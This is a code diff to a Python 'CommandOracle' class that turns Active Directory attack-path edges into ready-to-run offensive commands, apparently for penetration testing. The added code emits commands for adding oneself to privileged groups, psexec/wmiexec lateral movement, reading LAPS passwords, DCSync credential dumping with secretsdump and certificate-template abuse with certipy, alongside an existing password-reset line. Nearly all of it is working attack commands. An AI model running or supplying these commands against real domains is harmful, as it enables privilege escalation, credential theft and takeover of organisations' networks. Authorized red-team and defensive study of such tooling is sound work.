@@ -166,6 +166,26 @@ class CommandOracle:
                 f"'net group \"{target_group}\" {member_to_add} /add /domain'"
             )
 
+        # AddSelf
+        if normalized_edge == "AddSelf":
+            target_group = target.name or "<TARGET_GROUP>"
+            self_member = source.name or "<SELF_PRINCIPAL>"
+            return (
+                "# AddSelf: add yourself to target group to inherit its privileges\n"
+                f"powershell -c \"Add-DomainGroupMember -Identity '{target_group}' -Members '{self_member}'\"\n"
+                "# Verify membership\n"
+                f"powershell -c \"Get-DomainGroupMember -Identity '{target_group}'\""
+            )
+
+        # AdminTo
+        if normalized_edge == "AdminTo":
+            target_host = target.name or "<TARGET_COMPUTER>"
+            return (
+                "# AdminTo: local admin rights on target host, use for remote execution/lateral movement\n"
+                f"impacket-psexec{auth_part} {domain}/{username}@{target_host}\n"
+                f"# Alternatives: impacket-wmiexec {domain}/{username}@{target_host} / impacket-smbexec"
+            )
+
         # AddAllowedToAct / AllowedToAct (RBCD write primitive)
         if normalized_edge in ("AddAllowedToAct", "AllowedToAct"):
             target_computer = target.name or "<TARGET_COMPUTER>"
@@ -204,13 +224,34 @@ class CommandOracle:
                     f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
                     f"'net user {target_user} {new_password}'"
                 )
-            else:
-                # AllExtendedRights on group/computer = full DACL control
-                target_object = target.name or target.id or "<TARGET_OBJECT>"
+
+            if target.node_type == "computer":
                 return (
-                    f"impacket-dacledit{auth_part} -action write -rights AllExtendedRights "
-                    f"-principal '{username}' -target '{target_object}' {domain}/{username}"
+                    "# AllExtendedRights on COMPUTER may allow reading LAPS credentials\n"
+                    f"powershell -c \"Get-ADComputer '{target.name or '<TARGET_COMPUTER>'}' "
+                    "-Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd\""
                 )
+
+            if target.node_type == "domain":
+                target_dc = target.name or "<DC_HOST>"
+                return (
+                    "# AllExtendedRights on DOMAIN can include replication rights (DCSync)\n"
+                    f"impacket-secretsdump{auth_part} {domain}/{username}@{target_dc} -just-dc"
+                )
+
+            if target.node_type == "certtemplate":
+                target_template = target.name or "<TEMPLATE>"
+                return (
+                    "# AllExtendedRights on CertTemplate grants enrollment rights (if CA publish/issuance prereqs are met)\n"
+                    f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                    f"-target <CA-SERVER> -template {target_template}"
+                )
+
+            target_object = target.name or target.id or "<TARGET_OBJECT>"
+            return (
+                f"impacket-dacledit{auth_part} -action write -rights AllExtendedRights "
+                f"-principal '{username}' -target '{target_object}' {domain}/{username}"
+            )
 
         # GenericWrite / CanGenericWrite
         if normalized_edge in ("GenericWrite", "CanGenericWrite"):
